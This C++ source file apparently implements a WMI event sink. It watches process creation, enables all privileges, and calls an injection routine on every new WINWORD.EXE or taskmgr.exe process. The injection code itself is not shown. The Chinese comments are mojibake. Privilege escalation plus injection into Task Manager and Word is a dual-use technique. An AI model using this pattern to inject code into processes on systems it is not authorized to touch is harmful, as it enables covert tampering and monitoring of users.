#include "stdafx.h"
#include "eventsink.h"
#include "Func.h"

BOOL  IsSpeileExe(LPWSTR pName )
{
	if( !wcsncmp( pName, L"smss.exe", wcslen(L"smss.exe")  ) ||
		!wcsncmp( pName, L"wininit.exe", wcslen(L"wininit.exe")  ) ||
		!wcsncmp( pName, L"winlogon.exe", wcslen(L"winlogon.exe")  ) ||
		!wcsncmp( pName, L"csrss.exe", wcslen(L"csrss.exe")  ) ||
		!wcsncmp( pName, L"spoolsv.exe", wcslen(L"spoolsv.exe")  ) ||
		!wcsncmp( pName, L"services.exe", wcslen(L"services.exe") ))
	{
		return FALSE;
	}

	return TRUE;
}




ULONG EventSink::AddRef()
{
	return InterlockedIncrement(&m_lRef);
}

ULONG EventSink::Release()
{
	LONG lRef = InterlockedDecrement(&m_lRef);
	if(lRef == 0)
		delete this;
	return lRef;
}

HRESULT EventSink::QueryInterface(REFIID riid, void** ppv)
{
	if (riid == IID_IUnknown || riid == IID_IWbemObjectSink)
	{
		*ppv = (IWbemObjectSink *) this;
		AddRef();
		return WBEM_S_NO_ERROR;
	}
	else return E_NOINTERFACE;
}

void GetProcessFullNameByPID(DWORD processID, TCHAR *pathname)   
{   
	//char szProcessName[MAX_PATH] = "unknown";   

	//Get a handle to the process.   
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);   

	//Get the process name.   
	if (hProcess)   
	{   
		HMODULE hMod;   
		DWORD cbNeeded;   

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))   
		{   
			GetModuleFileNameEx(hProcess, hMod, pathname, MAX_PATH);   
		}   
	}   

	//Print the process name and identifier.   


	//printf("%s (Process ID: %u)\n", szProcessName, processID);   

	CloseHandle(hProcess);   
}  
static int iTem = 0;

HRESULT EventSink::Indicate(long lObjectCount,
							IWbemClassObject **apObjArray)
{
	HRESULT				hres = S_OK;

	VARIANT				vEventClass;		//�¼����ͣ���������ɾ���� ��������
	_variant_t			_vEventClass("");		//C++�ı��ַ�װ���ͣ��������ղ�����vEventClass

	IWbemClassObject*	pObj = NULL;		//	

	VARIANT				vInst;				//���ڽ���Ŀ��ʵ��	
	_variant_t			_vInst;				//ʵ�ʲ����ı���


	_variant_t			_vEventCreate("__InstanceCreationEvent");		//�����ȽϵĴ����¼�ֵ	
	_variant_t			_vEventDelete("__InstanceDeletionEvent");		//ͬ�ϣ�ɾ���¼�

	VARIANT				vExeFullPath;
	VARIANT				vExePID;
	VARIANT				vExePPID;
	VARIANT				vCaption;
	_variant_t			_vCaption;
	_variant_t			_vExeFullPath;

	TCHAR				szProcFullPath[MAX_PATH];


	for (int i = 0; i < lObjectCount; i++)
	{
		pObj = apObjArray[i];
		hres = pObj->Get(_T("__Class"), 0, &vEventClass, 0, 0);
		if (FAILED(hres))
		{
			printf("Failed to get TargetInstance:%ld\n",hres);
		}
		
		_vEventClass.Attach(vEventClass);		
		printf("Event occurred\n");

		hres = pObj->Get(_T("TargetInstance"), 0, &vInst, 0, 0);
		if (FAILED(hres))
		{
			printf("Failed to get TargetInstance:%ld\n",hres);
		}

		try
		{			
			_vInst.Attach(vInst);	//ʹ��C++������VARIANT

			IWbemClassObjectPtr	pWinProcessObj(_vInst);

			hres = pWinProcessObj->Get(_T("ExecutablePath"), 0, &vExeFullPath, 0, 0);
			
			hres = pWinProcessObj->Get(_T("ProcessId"), 0, &vExePID, 0, 0); 
			hres = pWinProcessObj->Get(_T("ParentProcessId"), 0, &vExePPID, 0, 0);

			hres = pWinProcessObj->Get( _T("Caption"), 0, &vCaption, 0, 0);


			if (FAILED(hres))
			{
				printf("Failed to get ExecutablePath:%ld\n",hres);
			}
			else
			{
				if ( vExeFullPath.vt == VT_EMPTY )
				{
					GetProcessFullNameByPID(vExePID.lVal,szProcFullPath);
				}
				else
				{
					_vExeFullPath.Attach(vExeFullPath);
					_vCaption.Attach( vCaption );
					
					CString Caption;
					Caption = (TCHAR*)vCaption.bstrVal;
					
					// ����Ǵ������������Ҳ���ע�����
					if ( _vEventClass == _vEventCreate && 
						Caption.CompareNoCase(_T("WordInjectx64.exe")) && 
						Caption.CompareNoCase(_T("WordInjectx86.exe")))
					{
						//OutputDebugString(Caption+_T(" EventSink"));
						//ServiceModule()->WriteToLog(Caption+_T(" EventSink"));
						//CString UserName;
						// ���õ�ǰ����������Ȩ
						Func()->SetAllPrivileges(TRUE);
						// ֻע���SYSTEM�ʻ��µ��Ҹ����̲���Explorer�Ĳ�ע�롣
						/*if(QueryUserName(vExePID.lVal,UserName) && 
							UserName.CompareNoCase(_T("System")) && 
							(WinWordPid != 0 && WinWordPid != vExePPID.lVal))*/
					
						/*if(WinWordPid != 0 && WinWordPid != vExePPID.lVal)
						{

						}*/
						if((0 == Caption.CompareNoCase(_T("WINWORD.EXE")))
								|| (0 == Caption.CompareNoCase(_T("taskmgr.exe"))) )
						{
							OutputDebugString(Caption + _T("Inject "));
							// ע��
							Func()->Inject(vExePID.lVal);
							OutputDebugString(Caption + _T("Inject over"));
						}
						
						// �����WINWORD���̾͸��½���ID
						if (0 == Caption.CompareNoCase(_T("WINWORD.EXE")))
						{
							//OutputDebugString(_T("Caption explorer"));
							WinWordPid = vExePID.lVal;
						}
					}
				}

			}
			
		}
		catch (_com_error &err)
		{
			printf("caught _com_error:%d\n",err.Error());
		}

		_vEventClass.Clear();
		_vInst.Clear();
		_vExeFullPath.Clear();
		_vCaption.Clear();
	}

	return WBEM_S_NO_ERROR;
}

HRESULT EventSink::SetStatus(
							 /* [in] */ LONG lFlags,
							 /* [in] */ HRESULT hResult,
							 /* [in] */ BSTR strParam,
							 /* [in] */ IWbemClassObject __RPC_FAR *pObjParam
							 )
{
	if(lFlags == WBEM_STATUS_COMPLETE)
	{
		printf("Call complete. hResult = 0x%X\n", hResult);
	}
	else if(lFlags == WBEM_STATUS_PROGRESS)
	{
		printf("Call in progress.\n");
	}

	return WBEM_S_NO_ERROR;
}    // end of EventSink.cpp